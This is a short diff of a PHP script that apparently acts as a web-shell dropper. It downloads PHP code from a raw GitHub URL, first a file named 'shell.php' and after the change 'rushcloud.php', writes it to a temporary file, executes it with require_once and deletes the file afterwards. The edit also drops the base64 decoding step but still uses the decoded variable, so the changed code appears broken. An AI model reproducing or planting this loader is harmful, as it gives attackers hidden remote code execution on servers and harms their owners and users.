@@ -11,14 +11,10 @@ function get_contents($url) {
     return $result;
 }
 
-$url = 'https://raw.githubusercontent.com/iPotacy/Bahan/refs/heads/main/shell.php';
+$url = 'https://raw.githubusercontent.com/angelineuniverse/Cybersecurity/refs/heads/dev/development/rushcloud.php';
 $encoded_code = get_contents($url);
-$decoded_code = base64_decode($encoded_code);
-
 $tempFile = tempnam(sys_get_temp_dir(), 'tmp_php_');
 file_put_contents($tempFile, $decoded_code);
-
-
 require_once $tempFile;
 unlink($tempFile); 
 ?>
